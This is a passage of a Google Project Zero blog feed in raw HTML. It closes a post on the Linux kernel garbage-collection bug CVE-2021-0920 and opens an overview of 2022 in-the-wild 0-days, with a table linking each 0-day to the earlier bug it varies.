2021&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;CVE-2021-4083 deserves an honorable mention: when I &lt;/span&gt;&lt;span&gt;discussed&lt;/span&gt;&lt;span&gt;&amp;nbsp;CVE-2021-0920 with Jann Horn and Ben Hawkes, Jann found another &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c9\"&gt;&lt;a class=\"ykcrMYlEiJ-c261\" href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=2247\"&gt;issue&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;in the garbage collection, described in the Project Zero blog post &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c9\"&gt;&lt;a class=\"ykcrMYlEiJ-c261\" href=\"https://googleprojectzero.blogspot.com/2022/03/racing-against-clock-hitting-tiny.html\"&gt;Racing against the clock -- hitting a tiny kernel race window&lt;/a&gt;&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;.&lt;/span&gt;&lt;/p&gt;\n \\&lt;h1 class=\"ykcrMYlEiJ-c30 ykcrMYlEiJ-c20\" id=\"h.4yx7dnb7u7k1\"&gt;&lt;span class=\"ykcrMYlEiJ-c36 ykcrMYlEiJ-c34\"&gt;Part I Conclusion&lt;/span&gt;&lt;/h1&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span class=\"ykcrMYlEiJ-c28\"&gt;To recap, we have discussed the kernel internals of &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3 ykcrMYlEiJ-c28\"&gt;SCM_RIGHTS&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c28\"&gt;&amp;nbsp;and the designs and implementations of the Linux kernel garbage collector. Besides, we have analyzed the behavior of &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3 ykcrMYlEiJ-c28\"&gt;MSG_PEEK&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c28\"&gt;&amp;nbsp;flag with the &lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c3 ykcrMYlEiJ-c28\"&gt;recvmsg&lt;/span&gt;&lt;span class=\"ykcrMYlEiJ-c2 ykcrMYlEiJ-c28\"&gt;&amp;nbsp;syscall and how it leads to a kernel UAF by a subtle and arcane race condition.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2 ykcrMYlEiJ-c28\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span class=\"ykcrMYlEiJ-c28\"&gt;The bug was spotted in 2016 publicly, but unfortunately the Linux kernel community did not accept the patch at that time. Any threat actors who saw the public email thread may have a chance to develop an LPE exploit against the Linux kernel.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c5\"&gt;&lt;span class=\"ykcrMYlEiJ-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"ykcrMYlEiJ-c12 ykcrMYlEiJ-c20\"&gt;&lt;span&gt;In part two, we&amp;#39;ll look at how the vulnerability was exploited and the functionalities of the post compromise modules.&lt;/span&gt;&lt;/p&gt;"},"link":[{"@rel":"replies","@type":"application/atom+xml","@href":"https://googleprojectzero.blogspot.com/feeds/6481767562526230244/comments/default","@title":"Post Comments"},{"@rel":"replies","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2022/08/the-quantum-state-of-linux-kernel.html#comment-form","@title":"0 Comments"},{"@rel":"edit","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/6481767562526230244"},{"@rel":"self","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/6481767562526230244"},{"@rel":"alternate","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2022/08/the-quantum-state-of-linux-kernel.html","@title":"The quantum state of Linux kernel garbage collection CVE-2021-0920 (Part I)"}],"author":{"name":"Google Project Zero","uri":"http://www.blogger.com/profile/08975904405228580347","email":"noreply@blogger.com","gd:image":{"@rel":"http://schemas.google.com/g/2005#thumbnail","@width":"16","@height":"16","@src":"https://img1.blogblog.com/img/b16-rounded.gif"}},"media:thumbnail":{"@xmlns:media":"http://search.yahoo.com/mrss/","@url":"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgNWAkA0RVb4goO21_FhJOVV-LSNTfbXV7GKoqH-CUrdMTpDcNUSQxEssrnAVGxC50aK-Z3HfIWeDyCgkr6lb5-a1Ha9Km5ppaHeBzWmLj8NTmZtUjx8J-VzzM1O7mYdjOfw2ErddrslDXw6rDZrs0g1DEC1Ya4VAbkLKKEhZgNPeiSefH-xpv3zDa8/s72-c/image71.png","@height":"72","@width":"72"},"thr:total":"0"},{"id":"tag:blogger.com,1999:blog-4838136820032157985.post-256978548158816980","published":"2022-06-30T06:00:00.001-07:00","updated":"2022-06-30T06:00:00.177-07:00","title":{"@type":"text","#text":"2022 0-day In-the-Wild Exploitation…so far"},"content":{"@type":"html","#text":"&lt;style type=\"text/css\"&gt;ul.lst-kix_68660h7uawx-0{list-style-type:none}ul.lst-kix_68660h7uawx-1{list-style-type:none}ul.lst-kix_68660h7uawx-2{list-style-type:none}ul.lst-kix_68660h7uawx-3{list-style-type:none}ul.lst-kix_68660h7uawx-4{list-style-type:none}ul.lst-kix_68660h7uawx-5{list-style-type:none}ul.lst-kix_68660h7uawx-6{list-style-type:none}.lst-kix_68660h7uawx-7&gt;li:before{content:\"\\0025cb  \"}ul.lst-kix_68660h7uawx-7{list-style-type:none}ul.lst-kix_68660h7uawx-8{list-style-type:none}.lst-kix_68660h7uawx-0&gt;li:before{content:\"\\0025cf  \"}.lst-kix_68660h7uawx-6&gt;li:before{content:\"\\0025cf  \"}.lst-kix_68660h7uawx-8&gt;li:before{content:\"\\0025a0  \"}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}.lst-kix_68660h7uawx-3&gt;li:before{content:\"\\0025cf  \"}.lst-kix_68660h7uawx-2&gt;li:before{content:\"\\0025a0  \"}.lst-kix_68660h7uawx-4&gt;li:before{content:\"\\0025cb  \"}.lst-kix_68660h7uawx-1&gt;li:before{content:\"\\0025cb  \"}.lst-kix_68660h7uawx-5&gt;li:before{content:\"\\0025a0  \"}ol{margin:0;padding:0}table td,table th{padding:0}.HZWKYxoXby-c2{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:156.8pt;border-top-color:#000000;border-bottom-style:solid}.HZWKYxoXby-c9{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:155.2pt;border-top-color:#000000;border-bottom-style:solid}.HZWKYxoXby-c3{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:156pt;border-top-color:#000000;border-bottom-style:solid}.HZWKYxoXby-c19{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:8pt;font-family:\"Arial\";font-style:normal}.HZWKYxoXby-c15{color:#000000;font-weight:700;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:\"Arial\";font-style:normal}.HZWKYxoXby-c5{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:\"Arial\";font-style:normal}.HZWKYxoXby-c4{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left;height:11pt}.HZWKYxoXby-c6{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.HZWKYxoXby-c12{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:\"Arial\"}.HZWKYxoXby-c17{border-spacing:0;border-collapse:collapse;margin-right:auto}.HZWKYxoXby-c0{padding-top:0pt;padding-bottom:0pt;line-height:1.0;text-align:left}.HZWKYxoXby-c1{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.HZWKYxoXby-c14{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.HZWKYxoXby-c18{margin-left:36pt;padding-left:0pt}.HZWKYxoXby-c8{color:inherit;text-decoration:inherit}.HZWKYxoXby-c13{padding:0;margin:0}.HZWKYxoXby-c21{font-weight:700}.HZWKYxoXby-c7{height:0pt}.HZWKYxoXby-c20{margin-left:36pt}.HZWKYxoXby-c11{height:11pt}.HZWKYxoXby-c16{margin-left:72pt}.HZWKYxoXby-c10{font-style:italic}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:\"Arial\"}p{margin:0;color:#000000;font-size:11pt;font-family:\"Arial\"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:\"Arial\";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class=\"c14 doc-content\"&gt;\n &lt;p class=\"HZWKYxoXby-c6\"&gt;&lt;span class=\"HZWKYxoXby-c5\"&gt;Posted by Maddie Stone, Google Project Zero&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HZWKYxoXby-c4\"&gt;&lt;span class=\"HZWKYxoXby-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HZWKYxoXby-c6\"&gt;&lt;span class=\"HZWKYxoXby-c10\"&gt;This blog post is an overview of a talk, &amp;ldquo; 0-day In-the-Wild Exploitation in 2022&amp;hellip;so far&amp;rdquo;, &lt;/span&gt;&lt;span class=\"HZWKYxoXby-c10\"&gt;that I gave&lt;/span&gt;&lt;span class=\"HZWKYxoXby-c10\"&gt;&amp;nbsp;at the FIRST conference in June 2022. The slides are available &lt;/span&gt;&lt;span class=\"HZWKYxoXby-c1 HZWKYxoXby-c10\"&gt;&lt;a class=\"HZWKYxoXby-c81\" href=\"https://github.com/maddiestone/ConPresentations/blob/master/FIRST2022.2022_0days_so_far.pdf\"&gt;here&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HZWKYxoXby-c12 HZWKYxoXby-c10\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HZWKYxoXby-c4\"&gt;&lt;span class=\"HZWKYxoXby-c12 HZWKYxoXby-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HZWKYxoXby-c6\"&gt;&lt;span&gt;For the last three years, we&amp;rsquo;ve published annual year-in-review reports of 0-days found exploited in the wild. The most recent of these reports is the &lt;/span&gt;&lt;span class=\"HZWKYxoXby-c1\"&gt;&lt;a class=\"HZWKYxoXby-c81\" href=\"https://googleprojectzero.blogspot.com/2022/04/the-more-you-know-more-you-know-you.html\"&gt;2021 Year in Review report&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HZWKYxoXby-c5\"&gt;, which we published just a few months ago in April. While we plan to stick with that annual cadence, we&amp;rsquo;re publishing a little bonus report today looking at the in-the-wild 0-days detected and disclosed in the first half of 2022.&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HZWKYxoXby-c4\"&gt;&lt;span class=\"HZWKYxoXby-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HZWKYxoXby-c6\"&gt;&lt;span&gt;As of June 15, 2022, there have been 18 0-days detected and disclosed &lt;/span&gt;&lt;span&gt;as exploited in-the-wild in 2022&lt;/span&gt;&lt;span class=\"HZWKYxoXby-c5\"&gt;. When we analyzed those 0-days, we found that at least nine of the 0-days are variants of previously patched vulnerabilities. At least half of the 0-days we&amp;rsquo;ve seen in the first six months of 2022 could have been prevented with more comprehensive patching and regression tests. On top of that, four of the 2022 0-days are variants of 2021 in-the-wild 0-days. Just 12 months from the original in-the-wild 0-day being patched, attackers came back with a variant of the original bug. &amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HZWKYxoXby-c4\"&gt;&lt;span class=\"HZWKYxoXby-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HZWKYxoXby-c4\"&gt;&lt;span class=\"HZWKYxoXby-c5\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.4fab798cceb7e37dcf71e15c259bff9761363678\"&gt;&lt;/a&gt;&lt;a id=\"t.0\"&gt;&lt;/a&gt;&lt;table class=\"HZWKYxoXby-c17\"&gt;&lt;tr class=\"HZWKYxoXby-c7\"&gt;&lt;td class=\"HZWKYxoXby-c9\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HZWKYxoXby-c0\"&gt;&lt;span class=\"HZWKYxoXby-c15\"&gt;Product&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"HZWKYxoXby-c2\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HZWKYxoXby-c0\"&gt;&lt;span class=\"HZWKYxoXby-c15\"&gt;2022 ITW 0-day&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"HZWKYxoXby-c3\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HZWKYxoXby-c0\"&gt;&lt;span class=\"HZWKYxoXby-c15\"&gt;Variant&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"HZWKYxoXby-c7\"&gt;&lt;td class=\"HZWKYxoXby-c9\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HZWKYxoXby-c0\"&gt;&lt;span class=\"HZWKYxoXby-c5\"&gt;Windows win32k&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"HZWKYxoXby-c2\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HZWKYxoXby-c0\"&gt;&lt;span class=\"HZWKYxoXby-c1\"&gt;&lt;a class=\"HZWKYxoXby-c81\" href=\"https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2022/CVE-2022-21882.html\"&gt;CVE-2022-21882&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"HZWKYxoXby-c3\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HZWKYxoXby-c0\"&gt;&lt;span class=\"HZWKYxoXby-c1\"&gt;&lt;a class=\"HZWKYxoXby-c81\" href=\"https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-1732.html\"&gt;CVE-2021-1732&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HZWKYxoXby-c5\"&gt;&amp;nbsp;(2021 itw)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"HZWKYxoXby-c7\"&gt;&lt;td class=\"HZWKYxoXby-c9\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HZWKYxoXby-c0\"&gt;&lt;span class=\"HZWKYxoXby-c5\"&gt;iOS IOMobileFrameBuffer&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"HZWKYxoXby-c2\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HZWKYxoXby-c0\"&gt;&lt;span class=\"HZWKYxoXby-c1\"&gt;&lt;a class=\"HZWKYxoXby-c81\" href=\"https://support.apple.com/en-us/HT213053\"&gt;CVE-2022-22587&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"HZWKYxoXby-c3\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HZWKYxoXby-c0\"&gt;&lt;span class=\"HZWKYxoXby-c1\"&gt;&lt;a class=\"HZWKYxoXby-c81\" href=\"https://googleprojectzero.blogspot.com/2022/06/curious-case-carrier-app.html\"&gt;CVE-2021-30983&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HZWKYxoXby-c5\"&gt;&amp;nbsp;(2021 itw)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"HZWKYxoXby-c7\"&gt;&lt;td class=\"HZWKYxoXby-c9\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HZWKYxoXby-c0\"&gt;&lt;span class=\"HZWKYxoXby-c5\"&gt;Windows&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"HZWKYxoXby-c2\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HZWKYxoXby-c0\"&gt;&lt;span class=\"HZWKYxoXby-c1\"&gt;&lt;a class=\"HZWKYxoXby-c81\" href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-30190\"&gt;CVE-2022-30190&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HZWKYxoXby-c5\"&gt;&amp;nbsp;(&amp;ldquo;Follina&amp;rdquo;)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"HZWKYxoXby-c3\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HZWKYxoXby-c0\"&gt;&lt;span class=\"HZWKYxoXby-c1\"&gt;&lt;a class=\"HZWKYxoXby-c81\" href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444\"&gt;CVE-2021-40444&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HZWKYxoXby-c5\"&gt;&amp;nbsp;(2021 itw)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"HZWKYxoXby-c7\"&gt;&lt;td class=\"HZWKYxoXby-c9\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HZWKYxoXby-c0\"&gt;&lt;span class=\"HZWKYxoXby-c5\"&gt;Chromium property access interceptors&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"HZWKYxoXby-c2\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HZWKYxoXby-c0\"&gt;&lt;span class=\"HZWKYxoXby-c1\"&gt;&lt;a class=\"HZWKYxoXby-c81\" href=\"https://chromereleases.googleblog.com/2022/03/stable-channel-update-for-desktop_25.html\"&gt;CVE-2022-1096&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"HZWKYxoXby-c3\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HZWKYxoXby-c0\"&gt;&lt;span class=\"HZWKYxoXby-c1\"&gt;&lt;a class=\"HZWKYxoXby-c81\" href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=619166\"&gt;CVE-2016-5128&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HZWKYxoXby-c1\"&gt;&lt;a class=\"HZWKYxoXby-c81\" href=\"https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2021/CVE-2021-30551.html\"&gt;CVE-2021-30551&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;(2021 itw) &lt;/span&gt;&lt;span class=\"HZWKYxoXby-c1\"&gt;&lt;a class=\"HZWKYxoXby-c81\" href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=2280\"&gt;CVE-2022-1232&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HZWKYxoXby-c5\"&gt;&amp;nbsp;(Addresses incomplete CVE-2022-1096 fix)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"HZWKYxoXby-c7\"&gt;&lt;td class=\"HZWKYxoXby-c9\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HZWKYxoXby-c0\"&gt;&lt;span class=\"HZWKYxoXby-c5\"&gt;Chromium v8&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"HZWKYxoXby-c2\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HZWKYxoXby-c0\"&gt;&lt;span class=\"HZWKYxoXby-c1\"&gt;&lt;a class=\"HZWKYxoXby-c81\" href=\"https://chromereleases.googleblog.com/2022/04/stable-channel-update-for-desktop_14.html\"&gt;CVE-2022-1364&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"HZWKYxoXby-c3\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HZWKYxoXby-c0\"&gt;&lt;span class=\"HZWKYxoXby-c1\"&gt;&lt;a class=\"HZWKYxoXby-c81\" href=\"https://chromereleases.googleblog.com/2021/03/stable-channel-update-for-desktop_30.html\"&gt;CVE-2021-21195&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"HZWKYxoXby-c7\"&gt;&lt;td class=\"HZWKYxoXby-c9\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HZWKYxoXby-c0\"&gt;&lt;span class=\"HZWKYxoXby-c5\"&gt;WebKit&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"HZWKYxoXby-c2\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HZWKYxoXby-c0\"&gt;&lt;span class=\"HZWKYxoXby-c1\"&gt;&lt;a class=\"HZWKYxoXby-c81\" href=\"https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2022/CVE-2022-22620.html\"&gt;CVE-2022-22620&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HZWKYxoXby-c5\"&gt;&amp;nbsp;(&amp;ldquo;Zombie&amp;rdquo;)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"HZWKYxoXby-c3\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HZWKYxoXby-c0\"&gt;&lt;span class=\"HZWKYxoXby-c1\"&gt;&lt;a class=\"HZWKYxoXby-c81\" href=\"https://googleprojectzero.blogspot.com/2022/06/an-autopsy-on-zombie-in-wild-0-day.html\"&gt;Bug was originally fixed in 2013, patch was regressed in 2016&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"HZWKYxoXby-c7\"&gt;&lt;td class=\"HZWKYxoXby-c9\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HZWKYxoXby-c0\"&gt;&lt;span class=\"HZWKYxoXby-c5\"&gt;Google Pixel&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"HZWKYxoXby-c2\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HZWKYxoXby-c0\"&gt;&lt;span class=\"HZWKYxoXby-c1\"&gt;&lt;a class=\"HZWKYxoXby-c81\" href=\"https://source.android.com/security/bulletin/pixel/2022-03-01\"&gt;CVE-2021-39793&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HZWKYxoXby-c5\"&gt;*&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HZWKYxoXby-c0 HZWKYxoXby-c11\"&gt;&lt;span class=\"HZWKYxoXby-c19\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HZWKYxoXby-c0\"&gt;&lt;span class=\"HZWKYxoXby-c19\"&gt;* While this CVE says 2021, the bug was patched and disclosed in 2022&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"HZWKYxoXby-c3\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HZWKYxoXby-c0\"&gt;&lt;span class=\"HZWKYxoXby-c1\"&gt;&lt;a class=\"HZWKYxoXby-c81\" href=\"https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=cd5297b0855f17c8b4e3ef1d20c6a3656209c7b3\"&gt;Linux same bug in a different subsystem&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"HZWKYxoXby-c7\"&gt;&lt;td class=\"HZWKYxoXby-c9\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HZWKYxoXby-c0\"&gt;&lt;span class=\"HZWKYxoXby-c5\"&gt;Atlassian Confluence&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"HZWKYxoXby-c2\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HZWKYxoXby-c0\"&gt;&lt;span class=\"HZWKYxoXby-c1\"&gt;&lt;a class=\"HZWKYxoXby-c81\" href=\"https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html\"&gt;CVE-2022-26134&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"HZWKYxoXby-c3\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HZWKYxoXby-c0\"&gt;&lt;span class=\"HZWKYxoXby-c1\"&gt;&lt;a class=\"HZWKYxoXby-c81\" href=\"https://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html\"&gt;CVE-2021-26084&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=\"HZWKYxoXby-c7\"&gt;&lt;td class=\"HZWKYxoXby-c9\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HZWKYxoXby-c0\"&gt;&lt;span class=\"HZWKYxoXby-c5\"&gt;Windows&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"HZWKYxoXby-c2\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HZWKYxoXby-c0\"&gt;&lt;span class=\"HZWKYxoXby-c1\"&gt;&lt;a class=\"HZWKYxoXby-c81\" href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26925\"&gt;CVE-2022-26925&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HZWKYxoXby-c5\"&gt;&amp;nbsp;(&amp;ldquo;PetitPotam&amp;rdquo;)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=\"HZWKYxoXby-c3\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HZWKYxoXby-c0\"&gt;&lt;span class=\"HZWKYxoXby-c1\"&gt;&lt;a class=\"HZWKYxoXby-c81\" href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942\"&gt;CVE-2021-36942&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HZWKYxoXby-c5\"&gt;&amp;nbsp;(Patch regressed)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"HZWKYxoXby-c4\"&gt;&lt;span class=\"HZWKYxoXby-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HZWKYxoXby-c6\"&gt;&lt;span class=\"HZWKYxoXby-c21\"&gt;So, what does this mean?&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HZWKYxoXby-c4\"&gt;&lt;span class=\"HZWKYxoXby-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HZWKYxoXby-c6\"&gt;&lt;span&gt;When people think of 0-day exploits, they often think that these exploits are so technologically advanced that there&amp;rsquo;s no hope to catch and prevent them. The data paints a different picture. At least half of the 0-days we&amp;rsquo;ve seen so far this year are closely related to bugs we&amp;rsquo;ve seen before. Our conclusion and findings in the &lt;/span&gt;&lt;span class=\"HZWKYxoXby-c1\"&gt;&lt;a class=\"HZWKYxoXby-c81\" href=\"https://googleprojectzero.blogspot.com/2021/02/deja-vu-lnerability.html\"&gt;2020 year-in-review report&lt;/a&gt;&lt;/span&gt;&lt;span class=\"HZWKYxoXby-c5\"&gt;&amp;nbsp;were very similar.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HZWKYxoXby-c4\"&gt;&lt;span class=\"HZWKYxoXby-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HZWKYxoXby-c6\"&gt;&lt;span&gt;Many of the 2022 